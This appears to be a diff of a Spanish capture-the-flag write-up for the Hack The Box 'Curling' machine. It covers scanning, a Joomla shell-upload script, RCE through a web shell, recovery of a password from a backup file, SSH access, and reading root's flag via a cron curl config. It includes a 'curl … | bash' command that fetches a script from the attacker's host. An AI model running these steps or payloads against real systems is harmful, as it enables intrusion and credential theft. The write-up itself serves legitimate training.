@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -v -n 10.10.10.150
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 12:23 CST
 Initiating Ping Scan at 12:23
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 111.67 seconds
 
 Corroboremos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.150
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-06 18:46:43 GMT
@@ -80,7 +80,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -p80,22 -sV -sC -n 10.10.10.150
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 12:45 CST
 Nmap scan report for 10.10.10.150
@@ -111,7 +111,7 @@ Como podemos ver por la identificación de servicios, tenemos un servidor ssh y 
 
 # Joomscan
 
-```text
+``` text
 xbytemx@laptop:~/git/joomscan$ perl joomscan.pl -u http://10.10.10.150/
     ____  _____  _____  __  __  ___   ___    __    _  _
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
@@ -179,7 +179,7 @@ Tomando una captura de pantalla de la pagina tenemos lo siguiente:
 
 Realizaremos un httpie hacia la dirección:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ http http://10.10.10.150
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
@@ -225,7 +225,7 @@ Omití la parte superior, porque lo interesante se encuentra abajo; un comentari
 
 Ejecutamos directamente cewl en la dirección y obtendremos la siguiente lista:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ cewl http://10.10.10.150
 CeWL 5.4.4.1 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 the
@@ -454,7 +454,7 @@ Esta la podremos usar posteriormente como input en alguna parte.
 
 Realizamos un `httpie` directamente hacia el archivo `secret.txt`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/secret.txt
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -479,7 +479,7 @@ La salida fue un Base64, por lo que posteriormente lo mande a un _pipe_ para que
 
 Revisando nuevamente el contenido de la salida de httpie, podemos encontrar que hay un texto que incluye la firma de alguien:
 
-```html
+``` html
 <p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>
 <p>- Floris</p>
 ```
@@ -504,7 +504,7 @@ Como hemos revisado anteriormente, tenemos un joomla 3.8.8. Buscando rápidament
 
 El script modificado para funcionar en la maquina es el siguiente:
 
-```python
+``` python
 #!/usr/bin/env python
 # joomla_shellup.py - small script to upload shell in Joomla
 #
@@ -593,7 +593,7 @@ print '\n[+] Module finished.'
 
 Ejecutando la poc:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ python shell_uploader.py
 [+] Checking: http://10.10.10.150
 [+] Found init token: 9a1a9361861f0818bee33a93c029c15d
@@ -617,7 +617,7 @@ Correcto, hemos podido realizar un RCE sobre el servidor.
 
 Explorando un poco desde el RCE (en lugar de buscar una reverse shell):
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ http "http://10.10.10.150/templates/beez3/jsstrings.php?x=ls%20/home%20-lah"
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -664,7 +664,7 @@ Ese archivo _password\_backup_ luce bastante sospechoso, veamos su contenido:
 
 # password\_backup
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/templates/beez3/jsstrings.php?x=cat%20/home/floris/password_backup
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -696,13 +696,13 @@ Vary: Accept-Encoding
 
 Vamos a salvarlo para trabajarlo offline:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/templates/beez3/jsstrings.php?x=cat%20/home/floris/password_backup > password_backup
 ```
 
 Como podimos ver por la salida del `cat` se trata de una salida de hexdump, por lo que usemos `xxd` para convertirlo a binario y concatenemos con `file` para saber que tenemos por aqui:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r
 BZh91AY&SYHAP)ava:4NnT#@%`
 "n                         z@i4hdi9hQdh4i5nh*}y.<~x>    sVTzHߢ1V`Fs
@@ -712,7 +712,7 @@ BZh91AY&SYHAP)ava:4NnT#@%`
 
 Se trata de un archivo comprimido en bzip2, descomprimamos cuanto sea necesario:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2
 l[passwordrBZh91AY&SY6Ǎ@@Pt t"dhhOPIS@68ET>P@#I bՃ|3x(*N&Hk1x"{]B@6mxbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2 | file -
 /dev/stdin: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
@@ -727,7 +727,7 @@ xbytemx@laptop:~/htb/curling$ cat password.txt
 
 Finalmente, hemos obtenido el contenido de password.txt, veamos si corresponde a las credenciales de floris:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ ssh floris@10.10.10.150
 floris@10.10.10.150's password:
 Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)
@@ -757,7 +757,7 @@ Excelente, tenemos las credenciales del usuario en esta maquina.
 
 # cat user.txt
 
-```text
+``` text
 floris@curling:~$ ls -lah
 total 44K
 drwxr-xr-x 6 floris floris 4.0K May 22  2018 .
@@ -779,7 +779,7 @@ floris@curling:~$ cat user.txt
 
 Comenzamos por realizar una identificación con linenum:
 
-```text
+``` text
 xbytemx@laptop:~/htb/curling$ ssh floris@10.10.10.150 "curl http://10.10.12.67:4001/le.sh | bash" > le.log
 floris@10.10.10.150's password:
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -795,7 +795,7 @@ Este comando se ejecuta cada 60 segundos, según lo que pude ver en `watch -n1 '
 
 Tenemos luego entonces que root ejecuta cada 60s:
 
-```text
+``` text
 /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
 ```
 
@@ -803,7 +803,7 @@ Esto significa que _input_ es reiniciado cada 60 segundos.
 
 Por lo cual podemos concluir que _input_ debe tener alguna relación importante, por lo que veamos el contenido:
 
-```text
+``` text
 floris@curling:~$ cd admin-area/
 floris@curling:~/admin-area$ ls
 input  report
@@ -813,7 +813,7 @@ url = "http://127.0.0.1"
 
 Ese es el contenido que se reinicia, pero no sabemos aun como ese contenido tiene relación, ya que aun no sabemos como este archivo es usado por root o floris. Esto nos lleva a explorar a mayor detalle los procesos que se generan dentro de la maquina, por lo que descargamos _pspy_ para explorar los procesos:
 
-```text
+``` text
 floris@curling:/dev/shm$ wget http://10.10.12.67:4001/pspy64s
 --2019-04-02 04:50:55--  http://10.10.12.67:4001/pspy64s
 Connecting to 10.10.12.67:4001... connected.
@@ -826,11 +826,11 @@ pspy64s                           100%[=========================================
 2019-04-02 04:51:06 (91.3 KB/s) - ‘pspy64s’ saved [935452/935452]
 
 floris@curling:/dev/shm$ chmod +x pspy64s
- ```
+```
 
 Tras ejecutar pspy y esperar un minuto veremos los cronjobs ejecutados como root:
 
-```text
+``` text
 2019/04/02 04:54:01 CMD: UID=0    PID=6752   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 2019/04/02 04:54:01 CMD: UID=0    PID=6751   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 2019/04/02 04:54:01 CMD: UID=0    PID=6750   | sleep 1
@@ -847,7 +847,7 @@ Espera que el reporte se ejecute correctamente dentro de 60 segundos y reinicia 
 
 Ahora que sabemos como funciona los cronjobs de root, podemos realizar unos ajustes ya que la opcion `\-K` recibe como parámetro el archivo de input de configuración, lo cual nos permite controlar algunas opciones como url:
 
-```text
+``` text
 floris@curling:~/admin-area$ echo "url = \"file:///root/root.txt\"\noutput = /dev/shm/.deleteafterread" > input
 floris@curling:~/admin-area$ sleep 1 && cat /dev/shm/.deleteafterread && rm /dev/shm/.deleteafterread
 ```
